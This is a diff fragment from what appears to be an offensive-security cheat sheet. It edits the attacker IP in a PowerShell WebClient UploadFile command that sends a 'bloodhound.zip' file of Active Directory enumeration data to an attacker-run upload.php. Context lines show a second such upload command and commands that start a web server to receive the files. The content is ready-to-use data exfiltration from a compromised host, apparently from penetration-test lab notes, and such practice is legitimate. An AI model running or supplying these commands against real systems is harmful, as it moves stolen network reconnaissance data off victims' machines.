@@ -25,7 +25,7 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:88
 
 sudo systemctl apache2 start
 sudo php -S 0.0.0.0:80
-powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.238:90/upload.php', 'bloodhound.zip')
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.178:90/upload.php', 'bloodhound.zip')
 
 ### Powershell Linux to Windows
 ````
